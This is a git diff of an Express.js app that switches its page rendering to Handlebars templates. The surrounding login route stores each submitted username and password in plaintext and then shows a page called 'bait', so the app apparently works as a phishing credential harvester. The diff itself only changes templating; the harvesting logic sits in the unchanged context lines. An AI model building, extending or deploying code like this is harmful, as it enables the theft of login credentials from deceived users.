@@ -1,5 +1,6 @@
 const express = require('express');
 const mongoose = require('mongoose');
+const exphbs = require('express-handlebars');
 const path = require('path');
 const serverless = require('serverless-http');
 const port = 3000;
@@ -12,9 +13,13 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: false }));
 app.use(express.static(path.join(__dirname, '../static')));
+app.engine('hbs', exphbs.engine({
+    extname: 'hbs',
+}));
+app.set('view engine', 'hbs');
 
-router.get('/', async (req, res) => {
-    await res.sendFile(path.join(__dirname, '../static/index.html'));
+router.get('/', (req, res) => {
+    res.render('home');
 });
 
 router.post('/login', async (req, res) => {
@@ -22,7 +27,7 @@ router.post('/login', async (req, res) => {
         const { username, password } = req.body;
         if (!username || !password) throw new Error('Missing Credentials');
         await Data.create({ username, password });
-        await res.sendFile(path.join(__dirname, '../static/bait.html'));
+        res.render('bait');
     } catch (error) {
         console.log(error);
     }
